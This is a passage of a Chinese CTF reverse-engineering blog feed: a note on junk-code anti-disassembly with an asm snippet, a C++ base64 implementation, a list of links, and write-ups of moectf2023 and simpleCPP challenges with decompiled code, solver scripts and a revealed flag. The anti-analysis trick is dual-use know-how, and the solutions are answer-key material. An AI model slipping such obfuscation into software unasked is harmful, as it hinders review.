class="line">__asm &#123;</span><br><span class="line">call LABEL9;</span><br><span class="line">_emit 0x83;</span><br><span class="line">LABEL9:</span><br><span class="line">add dword ptr ss : [esp] , 8;给栈中的eip加8，直接跳过这几条语句</span><br><span class="line">ret;</span><br><span class="line">__emit 0xF3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么来详细了解一下call</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">call near xxx;默认为near，可省，相对下一条指令位置调用函数（段不变）</span><br><span class="line">E8 xx xx;</span><br><span class="line"></span><br><span class="line">call ax;间接绝对近距离调用</span><br><span class="line">call [addr];间接绝对近距离调用</span><br><span class="line">ff xx;</span><br><span class="line"></span><br><span class="line">call far 段基址:段内偏移;直接绝对远距离调用,可以不加far,返回必须用retf</span><br><span class="line">0x9a xx xx xx xx;前2字节是段内偏移，后2字节是段基址,这种情况下，CS和ip均要压栈</span><br><span class="line"></span><br><span class="line">call far [addr];间接绝对远距离调用</span><br><span class="line">ff1e xx xx xx xx;前2字节是段内偏移，后2字节是段基址</span><br></pre></td></tr></table></figure><hr><h2 id="一">一</h2><p>这之上是我一开始对花指令的了解，但是随着我出了flower_tea这道题之后，我对花指令有了（感觉上）更深的看法</p><p>花指令junk_code的目的：</p><p>针对反编译器，干扰反编译器使其无法解析指令，只能用机器码表示。再者就是考虑针对反编译器特性，选择构造结构让它们不能把对应代码识别成一个函数</p>]]></content>
      
      
      <categories>
          
          <category> 知识集 </category>
          
          <category> 逆向 </category>
          
          <category> 技能 </category>
          
          <category> 反静态分析 </category>
          
          <category> 花指令 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>base64实现</title>
      <link href="/posts/2c2fa1f6.html"/>
      <url>/posts/2c2fa1f6.html</url>
      
        <content type="html"><![CDATA[<p>最近在复习，把写的base64发在这里</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;String&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">std::string <span class="title">en</span><span class="params">(std::string str)</span> </span>&#123;</span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> string table = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&quot;</span>;</span><br><span class="line">std::vector&lt;<span class="type">uint8_t</span>&gt; input;</span><br><span class="line">std::vector&lt;<span class="type">uint8_t</span>&gt; output;</span><br><span class="line"><span class="comment">//初始化input</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">char</span> c : str) &#123;</span><br><span class="line">input.<span class="built_in">push_back</span>(c);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//长度检查</span></span><br><span class="line"><span class="type">const</span> <span class="type">uint8_t</span> len_before = str.<span class="built_in">length</span>();</span><br><span class="line"><span class="type">uint8_t</span> fix_num = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">switch</span> (len_before % <span class="number">3</span>) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">fix_num++;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">fix_num++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; fix_num; i++) &#123;</span><br><span class="line">input.<span class="built_in">push_back</span>(<span class="string">&#x27;\0&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//执行编码</span></span><br><span class="line"><span class="type">uint8_t</span> save[<span class="number">4</span>] = &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len_before; i += <span class="number">3</span>) &#123;</span><br><span class="line">save[<span class="number">0</span>] = input[i] &gt;&gt; <span class="number">2</span>;</span><br><span class="line">output.<span class="built_in">push_back</span>(table[save[<span class="number">0</span>]]);</span><br><span class="line">save[<span class="number">1</span>] = (input[i] &amp; <span class="number">0b00000011</span>) &lt;&lt; <span class="number">4</span> | input[i + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>;</span><br><span class="line">output.<span class="built_in">push_back</span>(table[save[<span class="number">1</span>]]);</span><br><span class="line">save[<span class="number">2</span>] = (input[i + <span class="number">1</span>] &amp; <span class="number">0b00001111</span>) &lt;&lt; <span class="number">2</span> | input[i + <span class="number">2</span>] &gt;&gt; <span class="number">6</span>;</span><br><span class="line">save[<span class="number">3</span>] = input[i + <span class="number">2</span>] &amp; <span class="number">0b00111111</span>;</span><br><span class="line">output.<span class="built_in">push_back</span>(table[save[<span class="number">2</span>]]);</span><br><span class="line">output.<span class="built_in">push_back</span>(table[save[<span class="number">3</span>]]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//处理末尾数据</span></span><br><span class="line"><span class="keyword">if</span> (output.<span class="built_in">back</span>() == table[<span class="number">0</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; fix_num; i++) &#123;</span><br><span class="line">output.<span class="built_in">pop_back</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; fix_num; i++) &#123;</span><br><span class="line">output.<span class="built_in">push_back</span>(table[<span class="number">64</span>]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//组合字符串并返回</span></span><br><span class="line"><span class="function">string <span class="title">res</span><span class="params">(output.begin(), output.end())</span></span>;</span><br><span class="line"><span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">std::string <span class="title">de</span><span class="params">(std::string str)</span> </span>&#123;</span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> string table = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&quot;</span>;</span><br><span class="line">vector&lt;<span class="type">uint8_t</span>&gt; input;</span><br><span class="line">vector&lt;<span class="type">uint8_t</span>&gt; output;</span><br><span class="line"><span class="comment">// 初始化input</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">char</span> c : str) &#123;</span><br><span class="line">input.<span class="built_in">push_back</span>(table.<span class="built_in">find</span>(c));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 执行解码</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; input.<span class="built_in">size</span>(); i += <span class="number">4</span>) &#123;</span><br><span class="line">output.<span class="built_in">push_back</span>((input[i] &lt;&lt; <span class="number">2</span>) | (input[i + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>));</span><br><span class="line"><span class="keyword">if</span> (input[i + <span class="number">2</span>] != <span class="number">64</span>) &#123;</span><br><span class="line">output.<span class="built_in">push_back</span>((input[i + <span class="number">1</span>] &lt;&lt; <span class="number">4</span>) | (input[i + <span class="number">2</span>] &gt;&gt; <span class="number">2</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (input[i + <span class="number">3</span>] != <span class="number">64</span>) &#123;</span><br><span class="line">output.<span class="built_in">push_back</span>((input[i + <span class="number">2</span>] &lt;&lt; <span class="number">6</span>) | input[i + <span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 组合字符串并返回</span></span><br><span class="line"><span class="function">string <span class="title">res</span><span class="params">(output.begin(), output.end())</span></span>;</span><br><span class="line"><span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;please use Ctrl+Z to quit\n&quot;</span>;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;please input your string:\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">string str;</span><br><span class="line"><span class="keyword">while</span> (<span class="built_in">getline</span>(cin, str))</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; <span class="built_in">en</span>(str) &lt;&lt; endl &lt;&lt; <span class="built_in">de</span>(<span class="built_in">en</span>(str)) &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;\nplease input your string:\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 实践 </category>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
            <tag> base64 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>收录文章</title>
      <link href="/posts/6fa4e3c4.html"/>
      <url>/posts/6fa4e3c4.html</url>
      
        <content type="html"><![CDATA[<h2 id="RE">RE</h2><p>[<a href="https://bbs.kanxue.com/thread-279604.htm#msg_header_h2_10">原创][花指令]由易到难全面解析CTF中的花指令-软件逆向-看雪-安全社区|安全招聘|kanxue.com</a></p><p><a href="https://www.52pojie.cn/thread-326995-1-1.html">UPX防脱壳机脱壳、去除特征码、添加花指令小探 - 『脱壳破解区』 - 吾爱破解 - LCG - LSG |安卓破解|病毒分析|www.52pojie.cn</a></p><p><a href="https://www.cnblogs.com/bEngi1/p/12173719.html">「学习笔记」对实模式/保护模式的三种访问内存机制的理解 - 幼麟 - 博客园 (cnblogs.com)</a></p><p><a href="https://www.cnblogs.com/chenwb89/p/operating_system_003.html#commentform">操作系统篇-分段机制与GDT|LDT - 卫卐 - 博客园 (cnblogs.com)</a></p><h2 id="CRYPTO">CRYPTO</h2><p><a href="https://lazzzaro.github.io/2020/05/06/crypto-RSA/index.html">RSA | Lazzaro (lazzzaro.github.io)</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>刷题记录(3)</title>
      <link href="/posts/e5147fe.html"/>
      <url>/posts/e5147fe.html</url>
      
        <content type="html"><![CDATA[<h1>RE（CPP）</h1><p>之前做的cpp的题还是太少了，一遇到这种抽象的就看都看不懂，遂决定要多做一下这些题。写这一篇文章的目的在于想要提高自己对cpp中反编译的代码的理解程度。然后笔者感觉之前的文章好像都很省略，这次准备多写一点文字和图，来讲解清楚。</p><hr><p>那先用一道题引入吧。这道题是moectf2023年的</p><h2 id="GUI">GUI</h2><p>先通过查找字符串找到主函数</p><p><img src="https://s2.loli.net/2024/03/11/y978CE6XWNuKbjZ.png" alt="image-20240311180850575"></p><p>主函数大致就是这样了</p><p>静态加动调两步法：</p><ol><li>静态分析发现：在<code>MessageBoxW(hWndParent, Text, L&quot;hint&quot;, 0);</code>的位置是正确位置，然后上面的比较是一个函数的返回值，传入了v7和v6，</li><li>不能通过直接的观察发现v7和v6的生成，但是通过动态调试可以发现v7在<code>sub_B00A0A((int)v7, (int)v8);</code>生成，v6在<code>same_op(a91);</code>生成，以及flag是在<code>GetWindowTextW(DlgItem, flag, 1024);</code>位置生成</li><li>通过观察函数名，发现flag传入了same_op,a91也传入了。</li></ol><p>那么看看a91，它是一个字符串，可以先提取出来，之后可能有用。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">0x000F</span>, <span class="number">0x003E</span>, <span class="number">0x0030</span>, <span class="number">0x0027</span>, <span class="number">0x0013</span>, <span class="number">0x0001</span>, <span class="number">0x007D</span>, <span class="number">0x0070</span>, <span class="number">0x0070</span>, <span class="number">0x0003</span>, <span class="number">0x007D</span>, <span class="number">0x0038</span>, <span class="number">0x000E</span>, <span class="number">0x007A</span>, <span class="number">0x0023</span>, <span class="number">0x007C</span>, <span class="number">0x000B</span>, <span class="number">0x001A</span>, <span class="number">0x003C</span>, <span class="number">0x007D</span>, <span class="number">0x0039</span>, <span class="number">0x007F</span>, <span class="number">0x003C</span>, <span class="number">0x004D</span>, <span class="number">0x004D</span>, <span class="number">0x004D</span>, <span class="number">0x0029</span>]</span><br></pre></td></tr></table></figure><p>然后程序肯定会读取flag，所以动态调试在same_op(flag)的位置下断点。</p><p>打开位置看一下，发现这个是在stack中。再尝试下断点。</p><p>[read and write]</p><p>然后放开程序，继续跑。</p><blockquote><p>如果断到断点了，不小心切出去了，可以在reg窗口eip的位置点箭头就会跳转回去。</p></blockquote><p>第一次断：</p><p><img src="https://s2.loli.net/2024/03/11/wMl21Gk4dS73icN.png" alt="image-20240311182131729"></p><p>根据这个函数名，很明显是在取len，第二次断到memmove函数，又是内部函数，然后再跑一次，出错了QAQ，这说明什么呢？</p><p>我猜想下面两种可能：</p><p>一个是用的二级指针，一个是copy的之后就没用了</p><p>所以就走不通了，那么这里就补充一手奇怪的cpp知识：</p><p>每个类实例化的时候都有一个构造函数/赋值函数对其赋值，所以如果遇到两个本来是一样类型的值进了同一个函数，可以大胆假设它们变成了一个类型，而这个题a91和flag都是这样，同时a91经过函数后v6就被赋值了，可以猜测v6就是a91变成类之后的地址，而flag之后还进行了一次加密，最后的值应该是从v8到v7，只有进入这个函数查看的时候，会发现v4和v3的值的含义</p><p><img src="https://s2.loli.net/2024/03/13/gcHhy3RzL1DXMk4.png" alt="image-20240313203446714"></p><p>虽然不知道a2是什么，但是动调之后都会发现v4和v3是指针，v4指向字符串第一个，v3指向最后一个，那么后面的循环就是加密了。</p><p>具体加密语句是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">start = sub_180956(a2);</span><br><span class="line">end = sub_18017C(a2);</span><br><span class="line"><span class="keyword">while</span> ( start != end )</span><br><span class="line">  sub_1816B7((*start++ - <span class="number">5</span>) ^ <span class="number">0x51</span>);</span><br></pre></td></tr></table></figure><p>而最后翻看源代码就知道：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">std::wstring <span class="title">EncryptFlag</span><span class="params">(<span class="type">const</span> std::wstring&amp; input)</span> </span>&#123;</span><br><span class="line">    std::wstring encrypted;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">wchar_t</span> c : input) &#123;</span><br><span class="line">        <span class="type">wchar_t</span> encryptedChar = (c - <span class="number">5</span>) ^ <span class="number">0x51</span>;  <span class="comment">// 加一操作</span></span><br><span class="line">        encrypted += encryptedChar;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> encrypted;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这表明了确实input是一个特殊类型，而源代码里的遍历被解释成两个指针的操作。</p><p>那么也可以确定最后的值就是a91，把它逆运算一下得到flag：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">b&#x27;\x39\x3b\x31\x0f\x3e\x30\x27\x13\x01\x7d\x70\x70\x03\x7d\x38\x0e\x7a\x23\x7c\x0b\x1a\x3c\x7d\x39\x7f\x3c\x4d\x4d\x4d\x29&#x27;</span></span><br><span class="line">decoded_s = s.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">ord_list = [<span class="built_in">ord</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> decoded_s]</span><br><span class="line">after = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> ord_list:</span><br><span class="line">    this_one = <span class="built_in">chr</span>((c^<span class="number">0x51</span>)+<span class="number">5</span>)</span><br><span class="line">    after += this_one</span><br><span class="line"><span class="built_in">print</span>(after)</span><br><span class="line"><span class="comment"># moectf&#123;GU1&amp;&amp;W1nd0w2_Pr1m3r!!!&#125;</span></span><br></pre></td></tr></table></figure><p>再次观察源代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> WM_COMMAND:</span><br><span class="line">    <span class="keyword">switch</span> (<span class="built_in">LOWORD</span>(wParam)) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        TCHAR buffer[<span class="number">512</span>];</span><br><span class="line">        <span class="built_in">GetWindowText</span>(<span class="built_in">GetDlgItem</span>(hWnd, <span class="number">2</span>), buffer, <span class="built_in">sizeof</span>(buffer));</span><br><span class="line">        std::wstring input = buffer;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 对输入进行加密操作</span></span><br><span class="line">        std::wstring encryptedInput = <span class="built_in">EncryptFlag</span>(input);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 正确加密后的 flag</span></span><br><span class="line">        std::wstring correctEncryptedFlag = <span class="string">L&quot;\x39\x3b\x31\xf\x3e\x30\x27\x13\x1\x7d\x70\x70\x3\x7d\x38\xe\x7a\x23\x7c\xb\x1a\x3c\x7d\x39\x7f\x3c\x4d\x4d\x4d\x29&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (encryptedInput == correctEncryptedFlag) &#123;</span><br><span class="line">            <span class="built_in">MessageBox</span>(hWnd, <span class="built_in">TEXT</span>(<span class="string">&quot;Congratulations! flag is correct！&quot;</span>), <span class="built_in">TEXT</span>(<span class="string">&quot;hint&quot;</span>), MB_OK);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">MessageBox</span>(hWnd, <span class="built_in">TEXT</span>(<span class="string">&quot;Sorry, flag error.&quot;</span>), <span class="built_in">TEXT</span>(<span class="string">&quot;hint&quot;</span>), MB_OK);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里的==由于类型不是原始类型，所以运算符被重载了</p><p>用ida进入这个函数查看：</p><p><img src="https://s2.loli.net/2024/03/13/qr52hv9nFy1udDI.png" alt="image-20240313204606697"></p><p>在第一个v6等于a2[5]的位置，进入a2看第6位是什么</p><p><img src="https://s2.loli.net/2024/03/13/OTvlDcA926toKIM.png" alt="image-20240313204701212"></p><p>进入分析后发现，第五个就是我们输入的字符串</p><p>而v5的位置是</p><p><img src="https://s2.loli.net/2024/03/13/jSg3KdxCYT4VXFR.png" alt="image-20240313204929328"></p><p>正确的加密之后的值，这里也能看出和a91一样</p><p>而v4我没有确定，v2是我输入的值的加密，那么最后的return就很明显是比较函数了，(函数名不一样是因为中间有跳转)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> __cdecl <span class="title function_">sub_18A7B0</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2, <span class="type">int</span> a3, <span class="type">int</span> a4)</span></span><br><span class="line">&#123;</span><br><span class="line">  __CheckForDebuggerJustMyCode(&amp;unk_258024);</span><br><span class="line">  <span class="keyword">return</span> a2 == a4 &amp;&amp; !sub_180654(a1, a3, a2);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">sub_18E010</span><span class="params">(<span class="type">unsigned</span> __int16 *a1, <span class="type">unsigned</span> __int16 *a2, <span class="type">int</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __CheckForDebuggerJustMyCode(&amp;unk_25801A);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !a3 )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *a1 != *a2 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ++a1;</span><br><span class="line">    ++a2;</span><br><span class="line">    --a3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( *a1 &gt;= (<span class="type">int</span>)*a2 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么大概这个题的逻辑就是这样。</p><hr><p>搞完上面这个题，3天已经过去了QAQ，但是差不多理解的就是，cpp里面函数特别抽象，所以要是没有符号表，硬推超级难搞，还是猜吧…</p><h2 id="simpleCPP">simpleCPP</h2><p>这道题有符号表，太好了，根据符号表就可以直接看出函数的作用</p><p>比如</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">v4 = <span class="built_in">sub_1400019C0</span>(std::cout, <span class="string">&quot;I&#x27;m a first timer of Logic algebra , how about you?&quot;</span>, envp);</span><br><span class="line">std::ostream::<span class="keyword">operator</span>&lt;&lt;(v4, sub_140001B90);</span><br><span class="line"><span class="comment">//就是</span></span><br><span class="line"><span class="comment">//cout &lt;&lt; &quot;I&#x27;m a first timer of Logic algebra , how about you?&quot;&lt;&lt;endl;</span></span><br><span class="line"><span class="built_in">sub_1400019C0</span>(std::cout, <span class="string">&quot;Let&#x27;s start our game,Please input your flag:&quot;</span>, v5);</span><br><span class="line"><span class="built_in">sub_140001DE0</span>(std::cin, Block);</span><br><span class="line"><span class="comment">//就是</span></span><br><span class="line"><span class="comment">//cout &quot;Let&#x27;s start our game,Please input your flag:&quot;&lt;&lt;endl;</span></span><br><span class="line"><span class="comment">// cin &lt;&lt; Block;</span></span><br></pre></td></tr></table></figure><p>十分方便</p><p>这种题就可以直接分析了。</p><p>mop好像会堆栈不平衡，于是用改标志位跳过。</p><p>分析一下：</p><p>先是对输入异或，然后每8位顺序读取合成一个变量，最后对4个变量执行方程上的操作</p><p>所以直接逆向，先z3，然后得结果</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r1 = BitVec(<span class="string">&#x27;r1&#x27;</span>, <span class="number">64</span>)</span><br><span class="line">r2 = BitVec(<span class="string">&#x27;r2&#x27;</span>, <span class="number">64</span>)</span><br><span class="line">r3 = BitVec(<span class="string">&#x27;r3&#x27;</span>, <span class="number">64</span>)</span><br><span class="line">j = BitVec(<span class="string">&#x27;j&#x27;</span>, <span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">v22 = r2 &amp; r1</span><br><span class="line">v23 = r3 &amp; ~r1</span><br><span class="line">v24 = ~r2</span><br><span class="line">v25 = r3 &amp; v24</span><br><span class="line">v26 = r1 &amp; v24</span><br><span class="line">v28 = r2</span><br><span class="line">v29 = r3</span><br><span class="line">flag = r3 &amp; v24 &amp; r1 | r3 &amp; (r2 &amp; r1 | r2 &amp; ~r1 | ~(r2 | r1))</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line">s.add(r3 &amp; ~r1 == <span class="number">0x11204161012</span>)</span><br><span class="line">s.add(flag == <span class="number">0x8020717153E3013</span>)</span><br><span class="line">s.add(r3 &amp; ~r1 | r2 &amp; r1 | r3 &amp; v24 | r1 &amp; v24 == <span class="number">0x3E3A4717373E7F1F</span>)</span><br><span class="line">s.add(((r3 &amp; ~r1 | r2 &amp; r1 | r3 &amp; v24 | r1 &amp; ~r2) ^ j) == <span class="number">0x3E3A4717050F791F</span>)</span><br><span class="line">s.add((r3 &amp; ~r1 | r2 &amp; r1 | r2 &amp; r3) == (~r1 &amp; r3 | <span class="number">0xC00020130082C0C</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> s.check() == sat:</span><br><span class="line">    m = s.model()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Solution found:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;r1 = &quot;</span>, m[r1])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;r2 = &quot;</span>, m[r2])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;r3 = &quot;</span>, m[r3])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;j = &quot;</span>, m[j])</span><br><span class="line">    <span class="comment"># 添加新的约束条件来排除当前的解，一定要是Or,可能出现有一个值不完全约束的情况</span></span><br><span 